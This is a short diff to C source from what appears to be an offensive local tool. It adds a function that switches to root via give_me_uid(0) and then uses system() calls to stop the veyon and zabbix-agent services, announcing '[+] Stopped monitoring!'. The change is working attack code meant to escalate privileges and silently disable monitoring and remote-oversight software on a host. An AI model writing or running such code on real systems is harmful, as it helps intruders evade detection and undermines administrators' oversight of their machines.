@@ -95,6 +95,15 @@ int delete_wheel_user(void) {
 	return 0;
 }
 
+int stop_monitoring_services(void) {
+	give_me_uid(0);
+	system("systemctl stop veyon.service");
+	system("systemctl stop zabbix-agent.service");
+	printf_success("[+] Stopped monitoring!");
+	return 0;
+
+}
+
 
 int main(int argc, char *argv[]) {
 	if (argc != 2) {
